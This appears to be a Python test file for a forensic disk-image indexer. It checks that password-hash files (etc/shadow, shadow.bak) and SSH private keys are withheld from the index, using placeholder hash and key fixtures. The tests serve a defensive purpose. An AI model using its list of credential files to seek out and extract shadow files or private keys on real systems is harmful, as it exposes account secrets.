    held = {"12": b"root:$6$salt$hash:19000::\n", "13": b"root:x:0:0::/root:/bin/sh\n"}

    def fake_icat(image: str, offset: int, inode: str, *_: object, **__: object) -> Any:
        return subprocess.CompletedProcess(["icat"], 0, held[inode], b"")

    with (
        patch("mulder.server.tools.extract.app_files.icat", side_effect=fake_icat),
        patch("mulder.server.tools.extract.tsk._resolve_partition_offset", return_value=0),
    ):
        result = _index(Path(image), "backups", extensions=["*"])

    assert result["sample_files"] == ["backups/passwd.bak"]
    assert result["files_withheld"] == 1 and result["withheld"] == ["backups/shadow.bak"]
    indexed = "".join(
        w.raw_text for s in case.get_sources() for w in case.get_windows_by_source(s.source_name)
    )
    assert "$6$salt$hash" not in indexed


def test_one_linux_image_does_not_make_every_image_of_the_case_a_linux_tree(
    case: CaseDB, tmp_path: Path
) -> None:
    """The Linux default (every name) is decided by the listing of the image asked about."""
    web, data = str(tmp_path / "web01.raw"), str(tmp_path / "data.raw")
    extract_and_index("r/r 12:\tetc/passwd\n", "tsk.filelist", web, "sleuthkit")
    extract_and_index(
        "r/r 5:\tapp/README\nr/r 6:\tapp/app.ini\n", "tsk.filelist", data, "sleuthkit"
    )
    content = subprocess.CompletedProcess(["icat"], 0, b"[app]\n", b"")

    with (
        patch("mulder.server.tools.extract.app_files.icat", return_value=content),
        patch("mulder.server.tools.extract.tsk._resolve_partition_offset", return_value=0),
    ):
        result = _index(Path(data), "app")

    assert result["sample_files"] == ["app/app.ini"] and ".ini" in result["extensions_used"]


def test_taking_every_name_does_not_take_password_hashes_or_private_keys(
    case: CaseDB, tmp_path: Path
) -> None:
    """The extension list used to keep etc/shadow out by accident; now it is on purpose."""
    root = _tree(
        tmp_path / "root",
        {
            "etc/passwd": "root:x:0:0::/root:/bin/bash\n",
            "etc/shadow": "root:$6$salt$hash:19000:0:99999:7:::\n",
            "etc/ssh/ssh_host_ed25519_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n",
            "etc/ssh/ssh_host_ed25519_key.pub": "ssh-ed25519 AAAA root@web01\n",
            "etc/ssh/sshd_config": "PermitRootLogin no\n",
        },
    )

    result = _index(root, "etc")

    assert sorted(result["sample_files"]) == [
        "etc/passwd",
        "etc/ssh/ssh_host_ed25519_key.pub",
        "etc/ssh/sshd_config",
    ]
    assert result["files_withheld"] == 2
    indexed = "".join(
        w.raw_text for s in case.get_sources() for w in case.get_windows_by_source(s.source_name)
    )
    assert "$6$salt$hash" not in indexed and "PRIVATE KEY" not in indexed
    only = _index(root, "etc/ssh", extensions=["*"], max_files=1)
    assert only["files_withheld"] == 1 and only["files_discovered"] == 2


def test_a_windows_tree_keeps_the_extension_list_unless_asked(
    case: CaseDB, tmp_path: Path
) -> None:
    root = kape(tmp_path / "k")
    write(root, {"C/Program Files/App/LICENSE": "MIT\n"})
    dirroot.refresh()

    assert _index(root, "Program Files/App")["sample_files"] == ["Program Files/App/app.ini"]
    asked = _index(root, "Program Files/App", extensions=["*"])
    assert sorted(asked["sample_files"]) == [
        "Program Files/App/LICENSE",
        "Program Files/App/app.ini",
    ]
